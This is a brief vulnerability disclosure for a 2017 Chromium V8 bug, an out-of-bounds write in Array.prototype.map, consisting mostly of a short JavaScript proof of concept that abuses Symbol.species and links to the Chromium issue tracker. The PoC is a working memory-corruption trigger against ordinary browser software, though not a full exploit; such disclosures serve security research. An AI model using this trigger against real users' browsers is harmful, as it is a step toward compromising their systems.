# CVE-2017-????
* Date : April 2017
* Credit : Oliver Chang

## Description
OOB write in `Array.prototype.map` builtin

## PoC
```js
class Array1 extends Array {
  constructor(len) {
    super(1);
  }
};

class MyArray extends Array {
  static get [Symbol.species]() {
    return Array1;
  }
}

a = new MyArray();
for (var i = 0; i < 10000000; i++) {
  a.push(1);
}

a.map(function(x) { return 42; });
```

## Reference
[issue 716044](https://bugs.chromium.org/p/chromium/issues/detail?id=716044)